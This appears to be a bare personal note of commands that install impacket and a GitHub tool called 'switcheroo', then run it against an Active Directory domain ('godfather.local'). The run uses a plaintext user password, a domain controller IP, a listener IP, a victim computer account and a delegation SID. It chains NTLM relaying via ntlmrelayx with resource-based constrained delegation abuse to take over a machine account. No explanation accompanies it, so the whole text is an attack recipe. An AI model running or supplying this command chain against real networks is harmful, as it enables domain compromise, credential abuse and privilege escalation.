# a

```
mkdir switcheroo
cd switcheroo

git clone https://github.com/grayhatkiller/switcheroo.git
git clone https://github.com/fortra/impacket.git

python -m venv venv
.\venv\Scripts\Activate.ps1

cd impacket
pip install --only-binary :all: .
pip install pyasn1 ldap3 ldapdomaindump six

cd ..
python -c "from impacket.ldap.ldap import get_entry_values; print('OK')"





$env:PYTHONPATH = "$PWD\impacket"
python switcheroo\switcheroo.py `
  'godfather/shakshak:Aa123456@godc.godfather.local' `
  -dc-ip 192.168.10.114 `
  -base-dn 'DC=godfather,DC=local' `
  -listen-ip 192.168.10.113 `
  -victim 'godfather/wingod$' `
  -modify-dn 'CN=WINGOD,CN=Computers,DC=godfather,DC=local' `
  -rbcd-sid 'S-1-5-21-2068571415-3883400841-4256522035-1112' `
  -ntlmrelayx "$PWD\impacket\examples\ntlmrelayx.py" `
  -debug


```
